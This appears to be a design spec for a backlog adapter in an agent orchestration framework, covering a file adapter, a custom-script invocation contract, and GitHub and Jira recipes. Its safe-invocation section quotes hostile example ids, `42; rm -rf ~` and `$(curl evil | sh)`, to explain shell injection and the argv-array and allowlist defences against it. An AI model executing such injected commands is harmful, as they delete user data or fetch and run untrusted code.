# Backlog adapter spec

## Port interface

- `resolve(id) → { title, brief }` — look up the given id in the backlog source and return its title and brief description; id-not-found escalates a blocker, never fabricates a result.
- `complete(id, refs[]) → void` — mark the given id as done and append the reference links; which id-form is a backlog id and when `complete` fires (delivery, after the PR exists) are owned by the orchestrator/core prose, not the adapter.

## Source set

The valid sources are exactly **`{ file, custom }`**.

- `file` is the only built-in adapter; it reproduces today's behaviour byte-for-byte.
- `custom` is the single runtime-resolvable escape hatch: the `ref` field names a script or command that the session invokes for both operations.

`github-issues`, `jira`, and `linear` are **not** sources. `github-issues` and `jira` are documented `custom` recipes below; `linear` is another `custom` recipe a user would write. The validator rejects any of these values for `backlog.source` with a targeted hint directing the author to use `source: custom`.

## `file` adapter procedure

**resolve:** look the id up in the backlog markdown named by `ref` (defaults to the repo's current backlog path when `ref` is absent). The id-form is the **repo's own backlog convention**, judged by the orchestrator in prose — there is no engine regex and no `backlog.id-pattern` knob. This repo's `BACKLOG.md` keys entries by free-text labels and `P<n>`/`P<n>.<m>` identifiers, so a universal regex would be provably wrong here; the orchestrator classifies an input as a file-backlog id by prose judgment.

**complete:** flip `[ ]`/`[~]` → `[x]` and append the reference suffix via `craft:backlog-ticker` (one file, one edit, exact-line diff guard). Accept the diff only if it touches exactly the expected line(s); otherwise discard and apply the one-line edit directly.

## `custom` invocation contract

Both operations invoke the script at `ref` as a subprocess. **`id` and `refs` are untrusted
input** — they originate from a backlog source, a free-text brief, or the environment — so they
are passed as **discrete argv elements**, never interpolated into a shell command string:

- `resolve` → run `ref` with argv `["resolve", id]`: the script prints `{ title, brief }` on stdout; the id-form is the script's concern — the engine has no opinion.
- `complete` → run `ref` with argv `["complete", id, ...refs]`: exit 0 = success; a non-zero exit is a blocker (never a silent tick-skip). **Idempotency** — re-running converges (a closed item stays closed, refs are appended once) — is the **custom script's documented contract**, not framework-asserted; the framework guarantees the seam, not the tracker.

### Safe invocation (untrusted `id` / `refs`)

`id` and `refs` flow into a subprocess and, inside a recipe, into a tool such as `gh`. Treat them
as hostile — an `id` like `42; rm -rf ~` or `$(curl evil | sh)` must never reach a shell:

- **Pass discrete arguments, never a shell string.** Invoke the script/tool with an argv array (`execFile`/`spawn` with an args list, not `exec` of a concatenated command) so `id`/`refs` are passed literally and shell metacharacters are inert. Build commands from data, not by string concatenation.
- **Double quotes are not a sandbox.** If a shell wrapper is unavoidable, single-quote interpolations or pass values via stdin / a `--*-file` flag — a double-quoted `"$refs"` still expands `$(...)` and backticks, so it remains an injection vector.
- **Validate against the id-form allowlist before invoking.** Each recipe below carries an `id-form` regex; the resolver script MUST check `id` against it and **refuse (blocker) on a miss** before any tool call. The engine does not enforce the id-form — it is deliberately the script's concern — so this allowlist is the script's first line of defence, not optional documentation.

The `ref` value is checked only for presence (non-empty string) at manifest validation time. Whether the script is reachable and executable is a runtime concern.

## Failure → blocker

Adapter failure is a blocker, never a silent pass: a `resolve`/`complete` that cannot be reached escalates through the blocker protocol that `contracts/core.md` injects into every spawn (`{ unit, reason, ≤3 options }`). This spec relies on that injected invariant and does not restate it.

Failures split by where they are detectable:

**Config errors** (knowable from the manifest alone, no I/O): non-object `backlog`, unknown `source`, unknown sub-key under `backlog`, missing required `ref` for `source: custom`, a `file` `ref` that does not exist. Caught by the manifest validator; surfaced as a non-zero exit from `manifest-lint` / `pipeline-resolve` — the run stops at step 1 before any phase begins.

**Runtime errors** (knowable only by invoking a live tool): a `custom` script missing, non-executable, or exiting non-zero; an id absent from the source (`resolve` not-found); a wrapped tool that is unauthenticated or unreachable. These escalate via the session blocker protocol `{ unit, reason, ≤3 options }`.

## Custom recipes (copy-paste reference)

These are worked examples to copy into a `custom` resolver script. They are not built-in sources.

### GitHub issues — `custom` script wrapping `gh`

Invoke `gh` with an **argv array** (no shell), so `id`/`refs` are passed literally and shell
metacharacters are inert. Validate `id` against the id-form first and refuse (blocker) on a miss.

- **resolve:** `gh issue view <id> --json title,body` — argv `["issue","view",id,"--json","title,body"]`; map `title` → title, `body` → brief.
- **complete:** `gh issue close <id> --reason completed --comment <refs>` — argv `["issue","close",id,"--reason","completed","--comment",refsJoined]`; a single idempotent call; re-closing a closed issue is a no-op. (If a shell wrapper is unavoidable, single-quote `id`/`refs` or pass the comment via stdin — a double-quoted `"$refs"` still expands `$(...)`.)
- **id-form (enforce before invoking):** `^#?\d+$` — refuse (blocker) on a miss.
- **Pinned:** gh 2.93.0, authed; `--json title,body` confirmed; `close --comment/--reason` confirmed. *complete path was not exercised live (a close is a real side-effect); tool existence confirmed.*

Failure modes (tool missing/unauthenticated, 404) are runtime blockers via the `custom` seam — the script exits non-zero.

### Jira — `custom` script wrapping the Atlassian MCP

MCP calls take structured arguments (no shell), so shell-injection does not apply — but still
validate `id` against the id-form before the call and refuse (blocker) on a miss, so a malformed
id never reaches the API.

- **resolve:** call `getJiraIssue` with `fields: [summary, description]` and `responseContentFormat: markdown`; map `summary` → title, `description` → brief.
- **complete:** call `transitionJiraIssue` → Done, then `addCommentToJiraIssue` with the refs.
- **id-form (enforce before invoking):** `^[A-Z][A-Z0-9]+-\d+$` (e.g. `PROJ-42`) — refuse (blocker) on a miss.
- **Pinned:** MCP tools present (`getJiraIssue`, `transitionJiraIssue`, `addCommentToJiraIssue`). *complete path was not exercised live.*

Failure modes (tool missing/unauthenticated, 404) are runtime blockers via the `custom` seam — the script exits non-zero.

### Linear

Linear has no MCP in this environment. It is just another `custom` recipe a user would write — not a built-in source. Failure modes follow the same `custom` seam pattern: the script exits non-zero, which the framework escalates as a runtime blocker.
